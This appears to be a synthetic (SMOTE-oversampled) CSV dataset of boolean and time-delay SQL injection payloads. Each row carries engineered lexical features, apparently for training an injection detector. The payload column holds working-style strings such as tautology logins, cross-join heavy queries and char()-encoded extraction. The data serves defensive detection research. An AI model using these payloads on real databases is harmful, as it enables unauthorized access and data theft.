id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000107,attack,boolean,"1' in boolean mode  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",nearest_attack_euclidean,R000076,1.2669386825508386,140.60092219066973,30.199538904665125,4.025703679374003,73.40599423935333,10.0,38.39677233265589,18.79815561866051,0.5218927037735558,0.07112560733166502,0.2732134689448288,0.1337682199499503,1.0,0.0,0.39907780933025494,0.0,1.0,1.0,0.0,5.3990778093302545,0.19953890466512747,5.0,4.0,2.399077809330255,1.0,0.0,0.1995389046651275,0.8004610953348725,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000108,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000171,0.47227697314176914,63.66234598301958,21.441563988679718,3.2975190574541386,5.662345983019577,16.0,28.0,14.0,0.0886041527212928,0.2514195440768847,0.4399842021345483,0.21999210106727415,4.0,0.0,1.0,0.0,0.7792180056601414,2.0,0.0,4.0,2.0,-1.1102230246251565e-16,0.22078199433985835,3.779218005660142,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000109,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000294,1.8264879732037669,142.17483498511902,33.65458355067356,4.184359895140245,70.96375065202068,14.247333681077691,35.840083811481826,21.123666840538846,0.5010534311211077,0.0981775798791131,0.25139575693889404,0.14937323206088512,2.061833420269423,0.0,2.0,0.0,1.0,1.5309167101347114,0.0,4.530916710134711,0.4690832898652886,5.0,4.0,5.061833420269423,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.5309167101347114,0.0,0.5309167101347114,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.061833420269423
SMOTE_000110,attack,boolean,"-6599%""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000091,0.6086601969643538,82.68619913016765,26.421549782541913,3.3933623154957875,12.144612554364521,16.0,38.264649347625735,16.27693722817739,0.14800642413622722,0.19454745335333634,0.4612186239286414,0.19622749858179508,0.0,3.9999999999999996,1.0,0.0,0.14461255436452214,2.0,0.0,5.7107748912709555,1.7107748912709555,0.8553874456354779,0.8553874456354779,3.1446125543645222,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000111,attack,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000285,0.06251829802815671,142.856032085873,32.928016042936505,4.143495392035874,71.9760053476455,8.976005347645502,42.952010695291,18.952010695291005,0.5038504647302563,0.06282805757441937,0.3006650068773454,0.132656470817979,0.0,1.0,2.0,0.0,1.0,1.0,0.0,6.0,1.0,-1.1102230246251565e-16,2.976005347645502,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.976005347645502,0.023994652354498047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000112,attack,boolean,"1' where 1031  =  1031 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000084,0.5770098098758083,200.16513096191753,34.520641370239694,3.821978045674941,58.735471234132305,32.0,77.90901835754553,31.52064137023969,0.2931989772045601,0.1601742998427328,0.38909131829715193,0.1575354046555551,1.1735471234132304,0.0,1.6529057531735392,0.0,0.0,2.0,0.0,16.34709424682646,0.0,1.0,3.0,10.0,1.0,0.0,0.8264528765867696,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.17354712341323048,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.173547123413231
SMOTE_000113,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000187,1.1260675692648445,60.581012467838306,23.36497922026949,3.7290606468941006,15.891983376215599,17.0,20.689029091622714,7.0,0.2633047552694452,0.28078807765083347,0.34028854687055465,0.11561862020916672,1.0,0.0,2.0,0.0,0.0,2.0,0.0,1.527004155946102,0.0,-1.1102230246251565e-16,0.0,4.472995844053898,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.47299584405389794,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.472995844053898
SMOTE_000114,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000047,0.6781376241107712,348.27458566636847,30.364167333248147,3.2741434751850074,82.1850039994889,50.0,163.63583266675187,52.45374900012778,0.2358897860150211,0.14357341145803068,0.46989206830197866,0.15064473422496952,0.0,3.9999999999999996,1.0,0.0,0.0,1.8179163333759254,0.0,34.0,1.6358326667518508,-1.1102230246251565e-16,0.0,12.817916333375925,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.0
SMOTE_000115,attack,boolean,"1'||  (  select 'cqjw' from dual where 7335  =  7335 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",nearest_attack_euclidean,R000064,1.2151730006128099,174.11231366129883,35.26966947695731,4.257221943702748,85.30330523042689,16.539338953914623,49.190991569128066,23.078677907829245,0.4896280970401034,0.09511587672499303,0.28247709901498114,0.13277892721992243,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,1.3483473847865564,2.5393389539146227,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,2.0,0.0,1.0,1.7303305230426886,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.730330523042689
SMOTE_000116,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000120,0.8799777759045705,144.11117194642708,31.58731027806101,4.132607917022779,79.41268972193899,6.349241112244039,41.34924111224404,17.0,0.5514520313584691,0.04375359902470638,0.28676181000017054,0.11803255961665403,0.0,3.5873102780610093,0.0,0.0,1.0,1.0,0.0,5.587310278061009,0.0,-1.1102230246251565e-16,2.4126897219389902,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.5873102780610097,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5873102780610098
SMOTE_000117,attack,boolean,"1 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000188,0.032398650572334015,92.08213967239507,29.023468477827162,3.7494854432142812,32.0,13.0,35.04693695565433,12.035202716740745,0.34753749785719784,0.1411871085044866,0.38059324894448515,0.13068214469383044,0.011734238913581052,0.0,2.0,0.0,1.0,1.0,0.0,6.011734238913581,0.011734238913581163,1.0,1.0,4.0,0.011734238913581052,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000118,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R000152,0.6873365239914739,64.6148233020673,24.0,3.9338900917020436,23.459293208269163,13.0,18.77035339586542,9.38517669793271,0.362856604804282,0.2012036771810397,0.2906264786764522,0.1453132393382261,4.0,0.0,0.0,0.0,0.0,1.3851766979327098,0.0,2.0,0.0,1.0,1.0,1.3851766979327098,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000119,attack,boolean,-9120'   )    )    or 8571  =  8571--,nearest_attack_euclidean,R000219,1.3461135869475895,38.23043713286964,14.820291421913092,2.9595680134420106,2.0,12.0,17.640582843826188,6.589854289043453,0.0523913011717978,0.31434780703078674,0.46014498047003694,0.1731159113273786,1.0,0.0,2.179708578086908,0.0,0.0,1.0,0.0,2.410145710956546,0.0,-1.1102230246251565e-16,0.0,3.179708578086908,1.0,0.0,0.5898542890434539,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000120,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000173,0.3370342555225163,140.49076651514713,32.0,4.12144962620697,66.60298211229251,16.443892201427314,41.53267064171278,15.911221559714537,0.4726062293183315,0.11758762976677883,0.29647987628181305,0.11332626463307663,0.08877844028546278,0.9112215597145372,2.0,0.0,1.0,2.0,0.0,5.177556880570926,0.0,0.08877844028546267,1.9112215597145372,5.0,0.08877844028546278,0.9112215597145373,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000121,attack,boolean,or 'text'   =   n'text',nearest_attack_euclidean,R000012,2.161548912717051,30.339296558772958,11.038693488548041,3.0567294843705386,12.223216093128826,3.6696482793864753,9.038693488548041,5.407738697709609,0.4224832534416337,0.08950361657040183,0.29959159525471296,0.18842153473325157,4.0,0.0,0.0,0.0,0.0,1.4077386977096085,0.0,0.0,0.0,-1.1102230246251565e-16,0.0,1.407738697709608,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.8154773954192167,0.5922613022903916,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4077386977096085
SMOTE_000122,attack,boolean,"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000141,0.02285986579985153,191.96331042149134,28.993885070248556,3.4682112067739626,108.00611492975145,12.0,52.975540280994224,18.981655210745668,0.5626438323530245,0.06251232848740211,0.27596461362040353,0.09887922553916981,0.0,0.9938850702485558,2.0,0.0,1.0,1.0,0.0,6.993885070248556,0.9938850702485558,-1.1102230246251565e-16,6.0,4.0,0.0,0.9938850702485559,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.006114929751444342,0.9938850702485558,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,boolean,"1"" where 5216  =  5216 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000251,1.2700516022519295,135.91573967215538,29.864467459019423,4.054516902896733,65.10744576503237,14.97191322405179,36.21489153006473,19.621489153006472,0.4811185567338434,0.10843226579587989,0.26529094813184223,0.1451582293384344,0.0,1.0,2.0,0.0,1.0,1.6214891530064737,0.0,4.621489153006474,0.37851084699352633,5.0,4.0,4.621489153006474,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.6214891530064737,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6214891530064737
SMOTE_000124,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,1.501725604988582,139.47303423039176,30.763482884804116,3.937440194021236,66.0747224975465,10.0,42.34438019362881,21.053931539216464,0.4735234078598031,0.07170108973397021,0.3037428103871201,0.15103269201910655,1.0,0.0,1.526965769608232,0.0,1.0,1.0,0.0,6.526965769608232,0.7634828848041159,5.0,4.0,3.526965769608232,1.0,0.0,0.7634828848041159,0.23651711519588417,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000125,attack,boolean,-7874   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  2817  =  2817,nearest_attack_euclidean,R000180,0.04530126601738881,382.76341620763037,28.035487568855444,3.084970685404979,80.10646270656633,57.964512431144556,191.7397578283934,52.952683241526074,0.20930670521980646,0.15143696725924666,0.5009152862813488,0.13834104123959803,0.0,0.0,1.0118291896184812,0.0,0.0,2.0,0.0,39.94085405190759,0.0,-1.1102230246251565e-16,0.0,13.011829189618481,0.0,0.0,0.011829189618481284,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.011829189618480895,0.0,1.0,0.9881708103815188,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.9999999999999999,17.0
SMOTE_000126,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000028,0.7003437806304598,118.39088278375728,29.776747745841487,3.813580368841064,43.418693646037156,14.446504508317027,43.86519815435418,16.660486475048916,0.3614671516351798,0.12944509143082955,0.367191568408475,0.1418961885255156,0.0,3.223252254158514,0.2232522541585139,0.0,0.0,1.0,0.0,8.660486475048916,0.0,1.0,2.5534954916829724,1.2232522541585138,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.0,0.2232522541585139,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7767477458414861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000127,attack,boolean," select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",nearest_attack_euclidean,R000017,2.597047382782564,59.87117899889323,22.0,3.6091676576715193,26.0,4.145196499815537,20.580785999262154,9.145196499815539,0.4347716678041137,0.069121741197795,0.3433749136841206,0.15273167731397072,0.0,2.0,2.0,0.0,1.0,2.145196499815538,0.14519649981553823,0.0,0.8548035001844617,-1.1102230246251565e-16,0.14519649981553817,5.145196499815539,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.14519649981553823,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000128,attack,boolean,"admin""  )   or   (  ""1""  =  ""1""--",nearest_attack_euclidean,R000006,0.09821896046292078,32.96429420057031,14.017852899714848,2.964176125604183,6.910735501425755,2.1785289971484794,13.928588401140608,9.946441300855456,0.20948603337542324,0.06643486657356716,0.42242746669565573,0.30165163335535383,0.0,4.928588401140608,2.017852899714848,0.0,0.0,1.0,0.0,1.982147100285152,0.017852899714847936,-1.1102230246251565e-16,0.0,3.017852899714848,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000129,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000253,0.7458270949611516,141.32540532890323,32.67459467109678,4.188419470163833,69.0,16.0,41.0,15.325405328903225,0.4882402872992547,0.11321513908388514,0.2901137939024557,0.10843077971440447,0.0,0.32540532890322454,2.0,0.0,1.0,2.0,0.0,5.0,0.0,-1.1102230246251565e-16,2.0,5.0,0.0,0.32540532890322454,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000130,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,1.065767887052286,119.34270967446874,31.0,3.806888723686347,50.49337243133521,10.688328446083098,41.77400586470028,16.387002932350143,0.40657463877369404,0.09646742179798923,0.3572975138306878,0.13966042559762895,1.0,0.0,2.0,0.0,1.0,1.0,0.0,7.0,1.0,0.5376656892166197,1.4623343107833802,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000131,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000097,1.2091357182870854,231.4192870454569,35.47124235177886,3.7375790353193605,67.12059058300488,28.23562117588943,93.88496940711545,42.17810587944716,0.2890379214157992,0.12278691808570673,0.4062640449052576,0.18191111559323647,4.0,0.0,0.0,0.0,0.0,2.0,0.0,20.471242351778862,2.0,1.6178105879447156,3.6178105879447156,10.471242351778862,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.9999999999999999,0.0,0.0,0.0,0.0,1.3821894120552844,0.6178105879447156,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.235621175889432,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.235621175889431
SMOTE_000132,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000072,0.8369689975999265,83.97829621609155,17.79565924321831,2.851159536148311,14.0,11.39421232429108,44.788424648582165,13.79565924321831,0.16804501525551382,0.13463129753733438,0.5333333333333333,0.16399035387381847,4.0,0.0,0.0,0.0,0.5985530810727702,2.0,0.0,7.197106162145541,0.0,-1.1102230246251565e-16,0.0,2.59855308107277,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000133,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000145,0.2958169366286255,78.53422825211834,21.786308699152663,3.0733967719804554,13.427382601694681,12.106845650423669,40.0,13.0,0.17074310714467814,0.15414322238301298,0.5095197512998557,0.1655939191724531,0.0,3.9999999999999996,0.8931543495763312,0.0,0.0,2.0,0.0,6.0,0.0,-1.1102230246251565e-16,0.10684565042366878,2.893154349576331,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,1.106845650423669,0.8931543495763311,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0000000000000004
SMOTE_000134,attack,boolean,"1'   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'tzbp'  =  'tzbp",nearest_attack_euclidean,R000196,2.1864024290136155,271.57558111156425,32.613213515176234,3.6661950801274013,54.915116222312854,71.0,112.28308650533066,33.37737838392078,0.20223244360037093,0.26417249271056203,0.41130871121411045,0.12228635247495658,2.1509513535683116,0.4622621616079222,0.0,0.0,2.0,1.537737838392078,0.0,21.22642703035247,0.0,-1.1102230246251565e-16,6.0,3.537737838392078,0.5377378383920778,0.4622621616079223,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.9999999999999996,0.0,0.0,1.0,1.537737838392078,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.5377378383920774
